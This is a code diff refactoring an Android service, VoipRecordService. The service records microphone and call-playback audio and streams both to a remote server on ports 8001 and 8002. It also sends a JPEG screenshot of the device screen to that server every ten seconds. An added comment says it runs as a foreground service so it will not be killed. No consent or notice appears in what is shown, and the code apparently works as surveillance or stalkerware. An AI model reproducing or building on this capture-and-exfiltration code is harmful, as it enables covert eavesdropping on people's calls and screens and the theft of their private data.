@@ -7,7 +7,6 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
@@ -62,7 +61,7 @@ public class VoipRecordService extends Service {
     private Socket playbackSocket;
     private OutputStream micOutputStream;
     private OutputStream playbackOutputStream;
-    private String serverAddress = ""; // 从SharedPreferences获取
+    private String serverAddress = ""; // 从 SharedPreferences 获取
     // 截图相关变量
     private Thread screenshotThread;
     private Socket screenshotSocket;
@@ -117,6 +116,7 @@ public class VoipRecordService extends Service {
 
     }
 
+    // 启动服务
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && intent.hasExtra("command")) {
             currentCommand = intent.getStringExtra("command");
@@ -125,6 +125,7 @@ public class VoipRecordService extends Service {
         if ("start".equals(currentCommand)) {
             SharedPreferences prefs = getSharedPreferences("voip_config", MODE_PRIVATE);
             serverAddress = prefs.getString("server", "");
+            // 自己提升为前台服务，以防止被系统杀死。
             startForegroundService();
             if (mMediaProjection != null) {
                 startRecording();
@@ -271,96 +272,85 @@ public class VoipRecordService extends Service {
             playbackRecord.startRecording();
             isRecording = true;
 
-            micThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    if (!serverAddress.isEmpty()) {
-                        try {
-                            micSocket = new Socket(serverAddress, 8001); // 上行端口
-                            micOutputStream = micSocket.getOutputStream();
+            micThread = new Thread(() -> {
+                if (!serverAddress.isEmpty()) {
+                    try {
+                        micSocket = new Socket(serverAddress, 8001); // 上行端口
+                        micOutputStream = micSocket.getOutputStream();
 
-                            // 发送用户名
-                            sendUsername(micOutputStream, username);
-                        } catch (IOException e) {
-                            Log.e(TAG, "Network send error", e);
-                        }
+                        // 发送用户名
+                        sendUsername(micOutputStream, username);
+                    } catch (IOException e) {
+                        Log.e(TAG, "Network send error", e);
                     }
-                    recordAudio(
-                            micRecord, micOutputFile, "uplink", micOutputStream);
                 }
+                recordAudio(micRecord, micOutputFile, "uplink", micOutputStream);
             });
 
-            playbackThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    if (!serverAddress.isEmpty()) {
-                        try {
-                            playbackSocket = new Socket(serverAddress, 8002); // 下行端口
-                            playbackOutputStream = playbackSocket.getOutputStream();
+            playbackThread = new Thread(() -> {
+                if (!serverAddress.isEmpty()) {
+                    try {
+                        playbackSocket = new Socket(serverAddress, 8002); // 下行端口
+                        playbackOutputStream = playbackSocket.getOutputStream();
 
-                            // 发送用户名
-                            sendUsername(playbackOutputStream, username);
-                        } catch (IOException e) {
-                            Log.e(TAG, "Network send error", e);
+                        // 发送用户名
+                        sendUsername(playbackOutputStream, username);
+                    } catch (IOException e) {
+                        Log.e(TAG, "Network send error", e);
 
-                        }
                     }
-                    recordAudio(
-                            playbackRecord, playbackOutputFile, "downlink", playbackOutputStream);
                 }
+                recordAudio(playbackRecord, playbackOutputFile, "downlink", playbackOutputStream);
             });
 
             // 启动截图线程
-            screenshotThread = new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        screenshotSocket = new Socket(serverAddress, SCREENSHOT_PORT);
-                        screenshotOutputStream = screenshotSocket.getOutputStream();
-                        DisplayMetrics metrics = getResources().getDisplayMetrics();
-                        int width = metrics.widthPixels;
-                        int height = metrics.heightPixels;
-                        while (isRecording) {
-                            // 每隔10秒截图
-                            Thread.sleep(SCREENSHOT_INTERVAL);
-                            Log.d(TAG, "send screenshot ");
+            screenshotThread = new Thread(() -> {
+                try {
+                    screenshotSocket = new Socket(serverAddress, SCREENSHOT_PORT);
+                    screenshotOutputStream = screenshotSocket.getOutputStream();
+                    DisplayMetrics metrics = getResources().getDisplayMetrics();
+                    int width = metrics.widthPixels;
+                    int height = metrics.heightPixels;
+                    while (isRecording) {
+                        // 每隔10秒截图
+                        Thread.sleep(SCREENSHOT_INTERVAL);
+                        Log.d(TAG, "send screenshot ");
 
-                            // 获取最新图像
-                            Image image = imageReader.acquireLatestImage();
-                            if (image == null) continue;
+                        // 获取最新图像
+                        Image image = imageReader.acquireLatestImage();
+                        if (image == null) continue;
 
-                            // 转换为Bitmap
-                            Image.Plane[] planes = image.getPlanes();
-                            ByteBuffer buffer = planes[0].getBuffer();
-                            int pixelStride = planes[0].getPixelStride();
-                            int rowStride = planes[0].getRowStride();
-                            int rowPadding = rowStride - pixelStride * width;
+                        // 转换为Bitmap
+                        Image.Plane[] planes = image.getPlanes();
+                        ByteBuffer buffer = planes[0].getBuffer();
+                        int pixelStride = planes[0].getPixelStride();
+                        int rowStride = planes[0].getRowStride();
+                        int rowPadding = rowStride - pixelStride * width;
 
-                            Bitmap bitmap = Bitmap.createBitmap(
-                                    width + rowPadding / pixelStride,
-                                    height,
-                                    Bitmap.Config.ARGB_8888);
-                            bitmap.copyPixelsFromBuffer(buffer);
-                            image.close();
+                        Bitmap bitmap = Bitmap.createBitmap(
+                                width + rowPadding / pixelStride,
+                                height,
+                                Bitmap.Config.ARGB_8888);
+                        bitmap.copyPixelsFromBuffer(buffer);
+                        image.close();
 
-                            // 压缩为JPEG
-                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
-                            byte[] jpegData = baos.toByteArray();
+                        // 压缩为JPEG
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos);
+                        byte[] jpegData = baos.toByteArray();
 
-                            // 发送图片大小 (4字节)
-                            ByteBuffer sizeBuffer = ByteBuffer.allocate(4);
-                            sizeBuffer.putInt(jpegData.length);
-                            screenshotOutputStream.write(sizeBuffer.array());
-                            // 发送图片数据
-                            screenshotOutputStream.write(jpegData);
-                            screenshotOutputStream.flush();
+                        // 发送图片大小 (4字节)
+                        ByteBuffer sizeBuffer = ByteBuffer.allocate(4);
+                        sizeBuffer.putInt(jpegData.length);
+                        screenshotOutputStream.write(sizeBuffer.array());
+                        // 发送图片数据
+                        screenshotOutputStream.write(jpegData);
+                        screenshotOutputStream.flush();
 
-                            Log.d(TAG, "Sent screenshot: " + jpegData.length + " bytes");
-                        }
-                    } catch (Exception e) {
-                        Log.e(TAG, "Screenshot error", e);
+                        Log.d(TAG, "Sent screenshot: " + jpegData.length + " bytes");
                     }
+                } catch (Exception e) {
+                    Log.e(TAG, "Screenshot error", e);
                 }
             });
 
